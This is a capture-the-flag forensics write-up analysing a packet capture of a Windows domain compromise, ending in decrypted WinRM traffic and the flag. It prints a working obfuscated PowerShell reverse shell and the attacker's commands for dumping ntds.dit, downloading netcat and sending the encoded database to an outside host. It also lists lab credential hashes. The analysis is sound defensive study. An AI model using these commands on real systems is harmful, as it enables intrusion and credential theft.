# Keep the steam activated

> The network in which our main source of steam is connected to, got compromised. If they managed to gain full control of this network, it would be a disaster! 

a 67MB pcap

there's SMB traffic, DCERPC, HTTP, http wsman (including the NTLM auth negotiation) ..

## TLDR

I did not finish this challenge before the end of the CTF, and pieced the answers together from various messages in the [HTB Discord](https://discord.com/invite/hackthebox) afterwards. There's a lot that goes on inside the pcap file, and this is more of a dump of notes of my analysis process and diving down different rabbit holes. 

The one-sentence solve is: extract ntds.dit and SYSTEM from the pcap, extract hashes out of it, and decrypt the winrm traffic on port 5985 using the Administrator's NTLM hash to get the flag.

## Attack Chain Analysis

For the sake of education, the attack chain in this pcap is quite typical and good to know, so I will summarize my analysis here. This attack chain, of course, is written after much of the analysis is done (so spoiler alert):

Attacker (machine 192.168.1.9) does credential spraying against accounts, and found `asmith` account with password Summer2020 (classic, lol)

then, runs something like psexec (because of the SMB3 and DCERPC traffic) to use those creds to login to the domain controller (domain CORP, machine CORP-DC, 192.168.1.10), to run commands (ran cmd.exe to spawn something along the lines ofpowershell.exe iex http://192.168.1.9/rev.ps1, which is a powershell reverse shell). The DCERPC traffic isn't encrypted.


After getting the ps rev shell on the Domain Controller, the attacker exports ntds.dit which is the DC database as well as the DC's SYSTEM registry hive to be able to decrypt the database), and then downloads n.exe (which is netcat) to exfil the ntds.dit and SYSTEM by base64 encoding them using certutil
- the ntds.dit and SYSTEM file therefore can be recovered by base64 decoding the netcat traffic (over port 8080) in the pcap, and therefore you get all the NTLM hashes as well as crack some of them.

Since now the attacker has the domain administrator account's NTLM hash, they proceed to use it to login to the DC over winrm (windows remote management/aka powershell remoting), over HTTP port 5985. The user agent in the traffic suggest probably the tool `evil-winrm` written in ruby (or some other ruby winrm client). The winrm traffic, just like the SMB3 ones are encrypted using NTLM negotiage.

Finally, after logging into the DC via winrm as administrator, the attacker drops the covenant C2 dropper, drop.ps1 over HTTP. This is a powershell C# in-memory assembly loader, which can be reversed by decoding the base64, decompressing it (I just modified the powershell and spit out the decompressed base64), and then decompiling the C# binary using dnSpy) to reveal the Covenant stager.

The covenant c2 traffic is over HTTP (last part of the pcap), and protected via RSA AES key exchange, which I can't decrypt because I can't crack the RSA 2048 bit key or find the AES session key anywhere without a memory dump




## Initial infection, rev.ps1 and netcat

powershell script rev.ps1:

```ps1
sv ('8mxc'+'p')  ([tyPe]("{1}{0}{2}" -f 't.encOdi','tex','nG') ) ;
${ClI`E`Nt} = &("{1}{0}{2}"-f 'je','New-Ob','ct') ("{5}{0}{8}{1}{2}{3}{4}{6}{7}" -f'y','m','.Net.So','ckets.T','C','S','PC','lient','ste')(("{0}{1}{2}" -f '192.168','.1','.9'),4443);
${sT`Re`Am} = ${C`L`IeNT}.("{0}{2}{1}"-f'Ge','tream','tS').Invoke();
[byte[]]${By`T`es} = 0..65535|.('%'){0};
while((${i} = ${str`EaM}.("{0}{1}" -f'Re','ad').Invoke(${bY`Tes}, 0, ${by`TEs}."Len`G`TH")) -ne 0){;
${d`AtA} = (.("{2}{1}{0}"-f '-Object','w','Ne') -TypeName ("{0}{3}{5}{1}{4}{2}" -f'Syst','ASCI','g','em.Text','IEncodin','.'))."gETSt`R`i`Ng"(${by`TES},0, ${i});
${SeN`DBacK} = (.("{0}{1}"-f 'ie','x') ${Da`Ta} 2>&1 | &("{0}{2}{1}"-f'Out-','ing','Str') );
${SENdb`AC`k2} = ${s`eNDb`ACK} + "PS " + (.("{1}{0}"-f'd','pw'))."P`ATH" + "> ";
${sE`NDBYtE} = (  (  vaRIaBle ('8MXC'+'P')  -ValUe  )::"ASC`Ii").("{2}{1}{0}"-f'es','tByt','Ge').Invoke(${SENdB`AC`K2});
${sT`REAM}.("{0}{1}" -f'Writ','e').Invoke(${S`e`NdbY`Te},0,${SE`NDbyTe}."lENG`TH");
${S`TR`eAM}.("{1}{0}" -f 'h','Flus').Invoke()};
${clIE`Nt}.("{0}{1}"-f 'Cl','ose')
```

it connects to 192.168.1.9:4443, basically a reverse shell


```	
PS C:\> whoami;hostname
corp\asmith
corp-dc
PS C:\> ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
C:\Windows\system32\ntdsutil.exe: ac i ntds
Active instance set to "ntds".
C:\Windows\system32\ntdsutil.exe: ifm
ifm: create full c:\temp
Creating snapshot...
Snapshot set {7f610e6f-46fe-4e74-9cc9-baa92f19f67a} generated successfully.
Snapshot {710fb56f-b795-44ef-b88a-d25aa3026d36} mounted as C:\$SNAP_202111051500_VOLUMEC$\
Snapshot {710fb56f-b795-44ef-b88a-d25aa3026d36} is already mounted.
Initiating DEFRAGMENTATION mode...
	 Source Database: C:\$SNAP_202111051500_VOLUMEC$\Windows\NTDS\ntds.dit
	 Target Database: c:\temp\Active Directory\ntds.dit

				  Defragmentation  Status (omplete)

		  0    10   20   30   40   50   60   70   80   90  100
		  |----|----|----|----|----|----|----|----|----|----|
		  ...................................................

Copying registry files...
Copying c:\temp\registry\SYSTEM
Copying c:\temp\registry\SECURITY
Snapshot {710fb56f-b795-44ef-b88a-d25aa3026d36} unmounted.
IFM media created successfully in c:\temp
ifm: q
C:\Windows\system32\ntdsutil.exe: q
PS C:\> iex (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.9/n.exe","C:\Users\Public\Music\n.exe")
PS C:\> certutil -encode "C:\temp\Active Directory\ntds.dit" "C:\temp\ntds.b64"
Input Length = 33554432
Output Length = 46137402
CertUtil: -encode command completed successfully.
PS C:\> certutil -encode "C:\temp\REGISTRY\SYSTEM" "C:\temp\system.b64"
Input Length = 15204352
Output Length = 20906044
CertUtil: -encode command completed successfully.
PS C:\> cat C:\temp\ntds.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
PS C:\> cat C:\temp\system.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
PS C:\> 
```

as shown, it uses certutil to encode files to exfil ntds.dit and SYSTEM hive, then send over netcat (`n.exe` is netcat).

Extracting the base64 encoded traffic and decoded them into ntds.dit and SYTSEM, then use [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) from impacket to extract hashes:



```
secretsdump.py -ntds ./ntds.dit -system SYSTEM local | tee secretsdump.txt

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x406124541b22fb571fb552e27e956557
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9da98598be012bc4a476100a50a63409
[*] Reading and decrypting hashes from ./ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8bb1f8635e5708eb95aedf142054fc95:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
CORP-DC$:1000:aad3b435b51404eeaad3b435b51404ee:94d5e7460c75a0b30d85744f633a0e66:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9555398600e2b2edf220d06a7c564e6f:::
CORP.local\fcastle:1103:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::
CORP.local\jdoe:1104:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::
WS01$:1105:aad3b435b51404eeaad3b435b51404ee:cd9c49cc4a1a535d27b64ab23d58f3e6:::
WS02$:1106:aad3b435b51404eeaad3b435b51404ee:98c3974cacc09721a351361504de4de5:::
CORP.local\asmith:1109:aad3b435b51404eeaad3b435b51404ee:acbfc03df96e93cf7294a01a6abbda33:::
[*] Kerberos keys from ./ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:6e5d1ccb7642b4bf855975702699f733034916dbd04bf4acddc36ac273b3f578
Administrator:aes128-cts-hmac-sha1-96:8d5709c4a7cab2e0f5fbb4a069b283fb
Administrator:des-cbc-md5:e302c7793b58ae97
CORP-DC$:aes256-cts-hmac-sha1-96:9c888129432a87257f81f6bb6affd91bc3b0ba9cf20e94ef9216364d79aab5bd
CORP-DC$:aes128-cts-hmac-sha1-96:0ac3c714050469724e5c41d21f7f86d3
CORP-DC$:des-cbc-md5:57497ce6972613da
krbtgt:aes256-cts-hmac-sha1-96:85c670ece27dad635c28630454154bb325b644b8f61d44f802b80c39277f529e
krbtgt:aes128-cts-hmac-sha1-96:15bfbb6b827c1904e49d77bf7624c2f4
krbtgt:des-cbc-md5:a2074373b920515d
CORP.local\fcastle:aes256-cts-hmac-sha1-96:c6319d38d781e145161c4b1a4ef11d08ad9be36c43b173b355f78c2cf2edf15a
CORP.local\fcastle:aes128-cts-hmac-sha1-96:144565c25d70678535b2908983d74f6e
CORP.local\fcastle:des-cbc-md5:6b0b2f01a731a78f
CORP.local\jdoe:aes256-cts-hmac-sha1-96:9d74074381d0000525c1cfbb24c2943e28bf415b89c8cf958eae5add39614ac8
CORP.local\jdoe:aes128-cts-hmac-sha1-96:7e0fb5fa7dcfa50ea0a8a55e08b63f74
CORP.local\jdoe:des-cbc-md5:610e67019e9b68ab
WS01$:aes256-cts-hmac-sha1-96:ccc215ff3ac06dc3e206f6e55cd1512f3bb00311d02c77591f3cb08e01d5a40f
WS01$:aes128-cts-hmac-sha1-96:5e94401d7da953a13d42809340ff6ec3
WS01$:des-cbc-md5:9885ea642f268ab3
WS02$:aes256-cts-hmac-sha1-96:dc3f081be6c29532904a073124a0998d857667cc5c531fcbe0f6d3e46d40eac2
WS02$:aes128-cts-hmac-sha1-96:7e494ea36b4fb80670f807a8c72e7b3d
WS02$:des-cbc-md5:b58a08dc9eabbc0d
CORP.local\asmith:aes256-cts-hmac-sha1-96:57e22c0b740ed35935f82a6e34ab84a683437105a4ab2f1f3ba70962d5c53112
CORP.local\asmith:aes128-cts-hmac-sha1-96:392a638579d925cca9e4ef7965b9dcdd
CORP.local\asmith:des-cbc-md5:839bd6e9380e40f7
[*] Cleaning up... 
```

## Attempting to decrypt SMB traffic

looks like the SMBv2/3 traffic was auth'd with asmith user:
```
	279	11.413385	192.168.1.10	192.168.1.9	SMB2	306	Negotiate Protocol Response	
	281	11.415637	192.168.1.9	192.168.1.10	SMB2	164	Negotiate Protocol Request	
	282	11.418435	192.168.1.10	192.168.1.9	SMB2	306	Negotiate Protocol Response	
	284	11.421385	192.168.1.9	192.168.1.10	SMB2	212	Session Setup Request, NTLMSSP_NEGOTIATE	
	285	11.425254	192.168.1.10	192.168.1.9	SMB2	359	Session Setup Response, Error: STATUS_MORE_PROCESSING_REQUIRED, NTLMSSP_CHALLENGE	
	287	11.429528	192.168.1.9	192.168.1.10	SMB2	508	Session Setup Request, NTLMSSP_AUTH, User: corp.local\asmith	
	288	11.435739	192.168.1.10	192.168.1.9	SMB2	139	Session Setup Response	
	289	11.440510	192.168.1.9	192.168.1.10	SMB2	220	Encrypted SMB3	
	290	11.444182	192.168.1.10	192.168.1.9	SMB2	190	Encrypted SMB3	
	291	11.447341	192.168.1.9	192.168.1.10	SMB2	242	Encrypted SMB3	
	292	11.450848	192.168.1.10	192.168.1.9	SMB2	262	Encrypted SMB3	
	293	11.455081	192.168.1.9	192.168.1.10	SMB2	294	Encrypted SMB3	
```

related writeup:
https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2

To calculate random session key, I need:

	username: asmith
	domain: corp.local
	password(ntlm hash, from ntds): acbfc03df96e93cf7294a01a6abbda33
	session key 297f9ce0a9551f892327f2ce9244a2da
	ntproofstr: in ntlmssp.ntlmv2_response.ntproofstr (NTProofStr: 85ce10334cc125590d85ca965cff0349)

didn work..

**extrating sess ids and keys from wireshark:**

add `smb2.sesid` and `ntlmssp.auth.sesskey` into columns, and filter by `smb2.sesid && ntlmssp.auth.sesskey`

```
tshark  -r ./capture.pcap -Y 'smb2.sesid && ntlmssp.auth.sesskey' -T fields -e smb2.sesid -e ntlmssp.auth.sesskey -e ntlmssp.ntlmv2_response.ntproofstr
0x000044000000002d	886fe4379670644fbf4e4c2c2f2fd506
0x000034000400001d	0000000041000000
0x0000440000000065	0000000041000000
0x0000440000000031	8b05a27cc206e10300dd0092a559a3c3
0x0000440000000035	589c0f29a9f8a1a25ff1dfc4b715e9b3
0x0000340004000021	000000003a010000
0x0000340004000025	000000003a010000
0x0000340004000029	000000003a010000
0x000034000400002d	0000000046010000
0x0000340004000031	0000000046010000
0x0000340004000035	0000000046010000
0x0000340004000039	0000000046010000
0x000034000400003d	0000000046010000
0x0000340004000041	0000000046010000
0x0000440000000069	0000000034010000
0x000044000000006d	0000000034010000
0x0000440000000071	0000000034010000
0x0000440000000075	0000000034010000
0x0000440000000079	0000000034010000
0x000044000000007d	0000000034010000
0x0000440000000039	b14fea02eb501b79ed36565f3d0be500
0x000044000000003d	71a9825023c1a77397dcd20dcaf840e6
0x0000440000000041	297f9ce0a9551f892327f2ce9244a2da
```

maybe need to use these session keys to calc the respectively SMB3 rand SK's:
(generated from wireshark `~/.config/wireshark/smb2_seskey_list`)

```
0000440000000041,297f9ce0a9551f892327f2ce9244a2da,,
000044000000003d,71a9825023c1a77397dcd20dcaf840e6,,
0000440000000039,b14fea02eb501b79ed36565f3d0be500,,
0000440000000035,589c0f29a9f8a1a25ff1dfc4b715e9b3,,
0000440000000031,8b05a27cc206e10300dd0092a559a3c3,,
000044000000002d,886fe4379670644fbf4e4c2c2f2fd506,,
```

using a for loop:


trying CORP, CORP.local, CORP.LOCAL , and corp.local as domain values, but not working for the calc random sk script

dialect in use is 3.0
```
tshark  -r ./capture.pcap -Y 'smb2' -T fields -e smb2.dialect|sort -u

0x00000202,0x00000210,0x00000300
0x000002ff
0x00000300
```

## drop.ps1

rewrite and drop the loading and execution of assembly:
```
... # sv o means variable $o is declared

write-host ([Convert]::ToBase64String($o.GetBuffer()))
```

that will print out the assembly as base64, then pipe it to base64 -d
```
pwsh ./print-drop.ps1 |base64 -d > assembly_drop.bin
file assembly_drop.bin 
assembly_drop.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows

```

decompile it
`mono ~/tools/dnspy/dnSpy.Console.exe -o dotnet-drop-decompiled ./assembly_drop.bin `

it's a grunt stager
https://www.virustotal.com/gui/file/866e05e475177856e4f945ea89ac7c907ab60f6a2f1ef64a48aaa422836f1b2e

Covenant C2
https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs


## registry SYSTEM

download regripper https://gitlab.com/kalilinux/packages/regripper/ and run with wine

```
wine rip.exe -r ~/ctf/htb-uni-2021-prequal/forensics_keep_the_steam/SYSTEM -f system > ~/ctf/htb-uni-2021-prequal/forensics_keep_the_steam/SYSTEM.regripper

```

But nothing much found in there

## Covenant C2

rewrite decompiled cs file to change dest IP to 127.0.0.1, and Console.WriteLine different encrypted/decrypted strings

then compile 
csc GruntStager.cs
```
sudo -u nobody mono ./GruntStager.exe
Could not create user key store '/nonexistent/.config/.mono/keypairs'.
  at Mono.Security.Cryptography.KeyPairPersistence.get_UserPath () [0x00086] in <533173d24dae460899d2b10975534bb0>:0 
  at Mono.Security.Cryptography.KeyPairPersistence.get_Filename () [0x00063] in <533173d24dae460899d2b10975534bb0>:0 
  at Mono.Security.Cryptography.KeyPairPersistence.Load () [0x00000] in <533173d24dae460899d2b10975534bb0>:0 
  at System.Security.Cryptography.RSACryptoServiceProvider.Common (System.Security.Cryptography.CspParameters p) [0x0000c] in <533173d24dae460899d2b10975534bb0>:0 
  at System.Security.Cryptography.RSACryptoServiceProvider..ctor (System.Int32 dwKeySize, System.Security.Cryptography.CspParameters parameters) [0x0001d] in <533173d24dae460899d2b10975534bb0>:0 
  at GruntStager.GruntStager.ExecuteStager () [0x001d3] in <88e87d205cce4ac2b097bf4865601d15>:0 
```

it generates a new 2048 byte RSA keypair to encrypt traffic w/ server

http traffic snippets:
```
POST /en-us/test.html HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Host: 192.168.1.9
Cookie: ASPSESSIONID=1daec7cae6; SESSIONID=1552332971750
Content-Length: 1036
Expect: 100-continue

HTTP/1.1 100 Continue

i=a19ea23062db990386a3a478cb89d52e&data=eyJHVUlEIjoiYTliZTM5NWJiYTFkYWVjN2NhZTYiLCJUeXBlIjowLCJNZXRhIjoiIiwiSVYiOiJPdzZOMDFXN213V0lPQlA3bEVXQUdRPT0iLCJFbmNyeXB0ZWRNZXNzYWdlIjoiV3NVT21BOEoraW5iNW1Yekd2YVF1R1hDZFNPTExtaXBBYlpRU3JDdHk3RkkxWmtKVnBhdUNlK0gvZlNleFh5OEp3OVRsS3BWNFZLRFNYWit2RStXdlVqOThUcW45UzVJZXVrWGIrZHI5S292bEhQVXRraGdVQmxYUml0V1hlRXlRUVJjNHhjck1tS1lVZW1UZXFZb3NucUlKaW5tcjJxUEZMSXlzOW5lVVM2dlMrc3c1YlJrU2tvQVFtNUlTUGNFMXBlYlF3UXNJWmRBMzdaVUtjb1hPZ2ZzRDlZZ0FKRVFzQzgxcnJ4SVNMbW5JaFkyU1YyUHdYQytvMVdZRlBRZFk5VDl1Yjg0R1N2QlF4SlZ1SWR4eTI5aHdWQ2RBMUJUUmxqTWxRaVRUb0tsbmhwbmJxQ2E5b29POG9DLzRTaVJXSzVPc1loL05DU1FTbWo2Q3lYR1J4NWVzTW1tZ252VGlaYjkxTXhIK09USm5ER0dMZlBNczFCSVNFU1A1YjB2S21mcXZVaDNFU2pBc243Zk94UTc3ckREYS9INmZuWlFlTVFlUjJMMFFoUTBLUmUwUlJCUUozRUxkOE42SlR6Zkw4U3FtdmJmTGNwNlE3Rys5eUdjdG1KNU13eDJ1K29CUENCWlRSQjBReDlucnpYMVgzTmFheWh6cnFzNVVvK2xJRm5FVTF6eEh5c29VeVRWczhIaUxCcks2cVBYWk5xMmFmRC8yV1hiaEhjPSIsIkhNQUMiOiJpVjNZZTZQNTQrQVhqTEM0RThaaUcweUJzd2NMNEJ3MEdvTEFTQ0FHdkNvPSJ9&session=75db-99b1-25fe4e9afbe58696-320bea73
HTTP/1.1 200 OK
```

http params are i (unused, for tracking) , **data** and session (unused, only for tracking)
data:

```
{"GUID":"a9be395bba1daec7cae6","Type":0,"Meta":"","IV":"Ow6N01W7mwWIOBP7lEWAGQ==","EncryptedMessage":"WsUOmA8J+inb5mXzGvaQuGXCdSOLLmipAbZQSrCty7FI1ZkJVpauCe+H/fSexXy8Jw9TlKpV4VKDSXZ+vE+WvUj98Tqn9S5IeukXb+dr9KovlHPUtkhgUBlXRitWXeEyQQRc4xcrMmKYUemTeqYosnqIJinmr2qPFLIys9neUS6vS+sw5bRkSkoAQm5ISPcE1pebQwQsIZdA37ZUKcoXOgfsD9YgAJEQsC81rrxISLmnIhY2SV2PwXC+o1WYFPQdY9T9ub84GSvBQxJVuIdxy29hwVCdA1BTRljMlQiTToKlnhpnbqCa9ooO8oC/4SiRWK5OsYh/NCSQSmj6CyXGRx5esMmmgnvTiZb91MxH+OTJnDGGLfPMs1BISESP5b0vKmfqvUh3ESjAsn7fOxQ77rDDa/H6fnZQeMQeR2L0QhQ0KRe0RRBQJ3ELd8N6JTzfL8SqmvbfLcp6Q7G+9yGctmJ5Mwx2u+oBPCBZTRB0Qx9nrzX1X3Naayhzrqs5Uo+lIFnEU1zxHysoUyTVs8HiLBrK6qPXZNq2afD/2WXbhHc=","HMAC":"iV3Ye6P54+AXjLC4E8ZiG0yBswcL4Bw0GoLASCAGvCo="}
```

it looks like the AES key is hardcoded in the code
```cs

byte[] key = Convert.FromBase64String("FRQ3mSFLiRv3Ej+wUcYN8p2O6ZWhQY5CY/Uoi9vOPRU=");
//..
aes.Mode = CipherMode.CBC;
aes.Padding = PaddingMode.PKCS7;

```

and the IV is sent over the wire in the message (Ow6N01W7mwWIOBP7lEWAGQ==)
(256 bit aes key)

decrypted:

```
<RSAKeyValue><Modulus>wPbZaF62q2lebrR8hlWWlpKoyN6hYK+aH3F5NyghbRf/S2oxIUy4ulckEMzfsClcVYQOPZmkEAq3/3v08tLmQH/rjT9gQ10q5zI2VhJ9CrAggl+qDH/Q6qPXDOTbat9Yog5CyHrVgwPF6CbpURKmk78jwC9zfoOyaZVSIEabKWbabI31FH+DvFeC6wXu2PHPWYpbadPRlgtHYYthpvFE0dqujOGaCdF49Slwi8JozZLyCJkUPICzYQaxgam6D/+02fFap14wcXmXivCjk9RGLXxkFzo+ER0KqW4gYTZ8fy0yggORQc9gX2Fo+vdPGsgqvFHkhUJHo2ABYy7YnTP1qQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
```



## winrm

User-Agent: Ruby WinRM Client (2.8.3, ruby 2.7.4 (2021-07-07))

that's probably `evil-winrm`, being used to pop a shell on the machine (192.168.1.10)

using administrator user to login
`21355	295.458600	192.168.1.9	192.168.1.10	HTTP	729	POST /wsman HTTP/1.1 , NTLMSSP_AUTH, User: \administrator		860790c6f2a8a86a8ef23d07fcf50a18	1a23f6839cac0e7d810bfe19ebe4ec97`

from the attacker machine (192.168.1.9)
```
POST /wsman HTTP/1.1
Authorization: Negotiate TlRMTVNTUAABAAAAN4II4AAAAAAgAAAAAAAAACAAAABrYWxp
Content-Type: application/soap+xml;charset=UTF-8
User-Agent: Ruby WinRM Client (2.8.3, ruby 2.7.4 (2021-07-07))
Accept: */*
Date: Fri, 05 Nov 2021 11:04:51 GMT
Content-Length: 0
Host: 192.168.1.10:5985
```


`echo TlRMTVNTUAABAAAAN4II4AAAAAAgAAAAAAAAACAAAABrYWxp |base64 -d
NTLMSSP7�  kali`

```
POST /wsman HTTP/1.1
Authorization: Negotiate TlRMTVNTUAADAAAAGAAYAEAAAAC2ALYAWAAAAAAAAAAOAQAAGgAaAA4BAAAAAAAAKAEAABAAEAAoAQAANYII4FGr0U9+BxjDLz6gUODFV8wssErtNeq9Ixoj9oOcrA59gQv+Gevk7JcBAQAAAAAAAIALVPQ00tcBLLBK7TXqvSMAAAAAAgAIAEMATwBSAFAAAQAOAEMATwBSAFAALQBEAEMABAAUAEMATwBSAFAALgBsAG8AYwBhAGwAAwAkAGMAbwByAHAALQBkAGMALgBDAE8AUgBQAC4AbABvAGMAYQBsAAUAFABDAE8AUgBQAC4AbABvAGMAYQBsAAcACACYUzolkdLXAQAAAAAAAAAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgCGB5DG8qioao7yPQf89QoY
Content-Type: application/soap+xml;charset=UTF-8
User-Agent: Ruby WinRM Client (2.8.3, ruby 2.7.4 (2021-07-07))
Accept: */*
Date: Fri, 05 Nov 2021 11:04:51 GMT
Content-Length: 0
Host: 192.168.1.10:5985

--
decoded:

NTLMSSP@��X��((5�Q��O~�/>�P��W�,�J�5�#�#����}�
                                              �����
                                                   T�4��,�J�5�CORPCORP-DCCORP.local$corp-dc.CORP.localCORP.loca�S:%���administrator����j��=��
```

so the attacker might have used the admin's NTLM hash to winrm straight into domain controller, before dropping drop.ps1 (Covenant agent)

> The :negotiate transport uses the rubyntlm gem to authenticate with the endpoint using the NTLM protocol. This uses an HTTP based connection but the SOAP message payloads are encrypted. If using HTTP (as opposed to HTTPS) this is the recommended transport. This is also the default transport used if none is specified in the connection options.

https://github.com/WinRb/WinRM

(port 5985 was used in this instance)
https://github.com/WinRb/WinRM/blob/ebbed119340c665d8220298c0103f0f106b3bc6b/lib/winrm/http/transport.rb#L415

this code explains roughly how the encryption works

chasing down to the root.. rubyntlm gem, looks like encryption is RC4

key derivation:
https://github.com/WinRb/rubyntlm/blob/59879617d14183bca538696722844dc582b4101f/lib/net/ntlm/client/session.rb#L195
```rb
 def calculate_user_session_key!
	@user_session_key = OpenSSL::HMAC.digest(OpenSSL::Digest::MD5.new, ntlmv2_hash, nt_proof_str)
  end
```

NTLMv2 hash:

```rb
  def ntlmv2_hash(user, password, target, opt={})
	if is_ntlm_hash? password
	  decoded_password = EncodeUtil.decode_utf16le(password)
	  ntlmhash = [decoded_password.upcase[33,65]].pack('H32')
	else
	  ntlmhash = ntlm_hash(password, opt)
	end
	userdomain = user.upcase + 
	unless opt[:unicode]target
	  userdomain = EncodeUtil.encode_utf16le(userdomain)
	end
	OpenSSL::HMAC.digest(OpenSSL::Digest::MD5.new, ntlmhash, userdomain)
  end
```

decrypt: https://github.com/WinRb/WinRM/blob/ebbed119340c665d8220298c0103f0f106b3bc6b/lib/winrm/http/transport.rb#L198

```rb
signature = str[4..19]
message = @ntlmcli.session.unseal_message str[20..-1]
return message if @ntlmcli.session.verify_signature(signature, message)
```


the structure of the sealed message is:
magic version number, 4 bytes (`[0..3]`)
signature, 16 bytes `[4..19]`
encrypted body

signature comprises of:
https://github.com/WinRb/WinRM/blob/ebbed119340c665d8220298c0103f0f106b3bc6b/lib/winrm/http/transport.rb#L60

```rb
  def sign_message(message)
	seq = sequence
	sig = OpenSSL::HMAC.digest(OpenSSL::Digest::MD5.new, client_sign_key, "#{seq}#{message}")[0..7]
	if negotiate_key_exchange?
	  sig = client_cipher.update sig
	  sig << client_cipher.final
	end
	"#{VERSION_MAGIC}#{sig}#{seq}"
  end
```
version magic is 4 bytes, sig is 8 bytes, seq is 4 bytes 

from index 20 onwards (indexed 0), its the message

keys tried (with cyberchef RC4) `./calc.hash.ntlm.py -u administrator -d CORP -p 8bb1f8635e5708eb95aedf142054fc95 -n 1a23f6839cac0e7d810bfe19ebe4ec97 -k 860790c6f2a8a86a8ef23d07fcf50a18
`

911f4cd0c5b88f40b043f778d7e0a3f1 (-d CORP) (**x** didn work)
0ab80e76c39961842058390183c9865c (-d '') x
8bb1f8635e5708eb95aedf142054fc95 (visible sess key in wireshark) x
07f64083e0d2708f0e4ab7ae0720df17 (CORP.local) x
40059807ebc0366b64b9cffe134b5948 (CORP.LOCAL) x


changing key gen method to ONLY return the exchange key (user_session_key)
a7c22bfdb0aca438fa0bcab5102e15e9  (-d '') x
e277ded65d1ce02bd8d284f93449d14a (-d CORP) x
4af7407f7547e3bea1c82ef183d55c54 (-d CORP.local) x

KeyExKey/exported key is  user_session_key

```rb
     def server_cipher
        @server_cipher ||=
          begin
            rc4 = OpenSSL::Cipher.new("rc4")
            rc4.decrypt
            rc4.key = server_seal_key
            rc4
          end
      end
```

server_seal_key:
```rb
SERVER_TO_CLIENT_SEALING = "session key to server-to-client sealing key magic constant\0"
# ^ wait, hardcoded string??

      def server_seal_key
        @server_seal_key ||= OpenSSL::Digest::MD5.digest "#{exported_session_key}#{SERVER_TO_CLIENT_SEALING}"
      end
```

example signature (frame 21358)
```
100000000 | 1000000 3d044790988167be 00000000
^ version    ver       hmac         ^ seq num (0)
```

a7c22bfdb0aca438fa0bcab5102e15e9 <--
```rb

      def server_seal_key
        @server_seal_key ||= OpenSSL::Digest::MD5.digest "#{exported_session_key}#{SERVER_TO_CLIENT_SEALING}"
      end
```

> dived down that rabbit hole, but did not figure out how to decrypt the traffic..

Post-CTF: after looking at various Discord messages, found that there's a script on Github that could decrypt the traffic using the NTLM hash...

**Found a script to decrypt it!** (after the ctf)

https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045/#file-winrm_decrypt-py

It didn't work (see issue https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045/#gistcomment-3968564), so I had to patch it manually. The patched script is here https://github.com/h4sh5/decrypt-winrm

Decrypting with the fixed script and administrator's NTLM hash from the secretsdump (`Administrator:500:aad3b435b51404eeaad3b435b51404ee:8bb1f8635e5708eb95aedf142054fc95:::`)

`python3 winrm_decrypt.py -n 8bb1f8635e5708eb95aedf142054fc95 ./capture.pcap`

analyzing the decrypting traffic in XML (has base64 blobs in it), and decoding it 

`rg -IN '<rsp:Stream' decrypted_winrm.txt |cut -d '>' -f 2 |cut -d '<' -f 1|base64 -d > streams_decoded_xml`

Found the flag via ripgrep'ing (https://github.com/BurntSushi/ripgrep) the output blob

```
rg -a HTB streams_decoded_xml 
8:���2"MG�Ay�pjN�﻿<Obj RefId="0"><MS><I32 N="PipelineState">4</I32></MS></Obj>R���t]�O�n�d8;�1�ږ;�'J�}L:�j4﻿<S>C:\Users\Administrator\Documents</S>g���t]�O�n�d8;�1�ږ;�'J�}L:�j4﻿<Obj RefI���﻿<Obj RefId="0"><MS><I32 N="PipelineState">4</I32></MS></Obj>R���t]�O�n�d8;�1�%ɼA����(�&﻿<S>C:\Users\Administrator\Documents</S>g���t]�O�n�d8;�1�%ɼA����(�&﻿<Obj RefId="0"><MS><I32 N="PipelineState">4</I32></MS></Obj>�^���t]�O�n�d8;�1��7��p�D���WR�~g﻿<S>HTB{n0th1ng_1s_tru3_3v3ryth1ng_1s_d3crypt3d}</S>���t]�O�n�d8;�1��7��p�D���WR�~g﻿<Obj RefId="0"><MS><I32 N="PipelineState">4</I32></MS></Obj>R���t]�O�n�d8;�1Ѹ�_�s(C��(��Rw�﻿<S>C:\Users\Administrator\Documents</S>g���t]�O�n�d8;�1Ѹ�_�s(C��(��Rw�﻿<Obj RefId="0"><MS><I32 N="PipelineState">4</I32></MS></Obj>

```

flag in above:
HTB{n0th1ng_1s_tru3_3v3ryth1ng_1s_d3crypt3d}

